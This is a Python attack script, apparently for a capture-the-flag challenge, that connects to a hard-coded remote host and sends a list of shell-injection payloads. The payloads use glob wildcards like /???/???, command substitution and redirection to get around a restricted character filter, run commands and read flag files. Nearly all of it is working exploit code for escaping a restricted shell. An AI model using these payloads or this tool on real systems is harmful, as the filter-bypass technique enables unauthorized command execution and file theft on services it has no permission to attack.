import socket
import time
import json
import sys

# Configuration
HOST = "94.237.123.87"
PORT = 44123

# Payloads designed for the specific character set: ^[0-9${}/?"[:space:]:&>_=()]+$
payloads = [
    # Basic information gathering
    "$?",                      # Last exit code
    "$$",                      # Current PID
    "$PATH",                   # PATH environment variable
    "$PWD",                    # Current directory
    "$HOME",                   # Home directory
    "$SHELL",                  # Shell type
    "$USER",                   # Current user

    # Directory exploration using wildcards
    "/???/???",                # Try to match /bin/cat or similar
    "/???/??",                 # Try to match /bin/ls or similar
    "/?/?",                    # Try to match /x/y
    "/??/?",                   # Try to match /xx/y
    "/???/?",                  # Try to match /xxx/y

    # Command execution attempts
    "$(/???/??)",              # Try to execute something in /bin/ls
    "$(/???/???)",             # Try to execute something in /bin/cat
    "$(/???/??/?)",            # Try to execute something in /bin/ls/x

    # File descriptor redirection
    ">&2",                     # Redirect stdout to stderr
    "2>&1",                    # Redirect stderr to stdout
    "5>&1",                    # Redirect fd 5 to stdout
    "5>&2",                    # Redirect fd 5 to stderr

    # Arithmetic operations (can leak info via errors)
    "$((1+1))",                # Basic arithmetic
    "$((PATH))",               # Try to leak PATH via arithmetic error
    "$((PWD))",                # Try to leak PWD via arithmetic error

    # Flag hunting
    "$(/???/??? ????)",         # Try to read flag (4 chars)
    "$(/???/??? ?????)",        # Try to read flag (5 chars)
    "$(/???/??? ??????)",       # Try to read flag (6 chars)
    "$(/???/??? ???????)",      # Try to read flag (7 chars)
    "$(/???/??? ????????)",     # Try to read flag (8 chars)
    "$(/???/??? ?????????)",    # Try to read flag (9 chars)
    "$(/???/??? ??????????)",   # Try to read flag (10 chars)

    # Flag location guessing
    "$(/???/??? /????/????)",   # Try to read /flag/flag
    "$(/???/??? /????)",        # Try to read /flag
    "$(/???/??? /????/????/????)", # Try to read /home/user/flag

    # Combined techniques
    "$(/???/??? /???/?????????) >&2", # Read flag and redirect to stderr
    "$(/???/??? /???/?????????) > /???/????", # Try to write flag to /tmp/flag
    "$(/???/??? /???/?????????) > /dev/fd/2", # Write flag to stderr
]

def connect_to_service():
    """Connects to the remote service."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))
        print(f"[+] Connected to {HOST}:{PORT}")

        # Receive initial banner
        banner = sock.recv(4096).decode('utf-8', errors='ignore')
        print("[+] Banner received:")
        print(banner)

        return sock
    except Exception as e:
        print(f"[-] Error connecting to {HOST}:{PORT}: {e}")
        return None

def send_payload(sock, payload):
    """Sends a single payload and returns the response."""
    try:
        print(f"\n[+] Sending payload: {repr(payload)}")
        sock.sendall((payload + '\n').encode())
        time.sleep(1)  # Give the server time to respond

        # Receive response
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        print("[*] Response:")
        print(response)

        return {"payload": payload, "response": response}
    except Exception as e:
        print(f"[-] Error sending payload: {e}")
        return {"payload": payload, "error": str(e)}

def main():
    """Main function to run the sandbox escape tool."""
    results = []

    sock = connect_to_service()
    if not sock:
        sys.exit(1)

    try:
        for i, payload in enumerate(payloads):
            print(f"\n[*] Testing payload {i+1}/{len(payloads)}")
            result = send_payload(sock, payload)
            results.append(result)

            # Save results after each test
            with open('sandbox_results.json', 'w') as f:
                json.dump(results, f, indent=2)

            # Check if the response contains anything interesting
            response = result.get("response", "")
            if "flag" in response.lower() or "htb" in response.lower():
                print("[!] Potential flag found in response!")

    except KeyboardInterrupt:
        print("\n[!] Testing interrupted by user")
    except Exception as e:
        print(f"[-] Error during testing: {e}")
    finally:
        try:
            sock.close()
        except:
            pass

        print("\n[+] Testing complete. Results saved to sandbox_results.json")
        print("[*] Promising payloads to try manually:")
        for result in results:
            payload = result.get("payload", "")
            response = result.get("response", "")
            if len(response) > 0 and "Broken@Shell$" not in response:
                print(f"  - {payload}")

if __name__ == "__main__":
    main()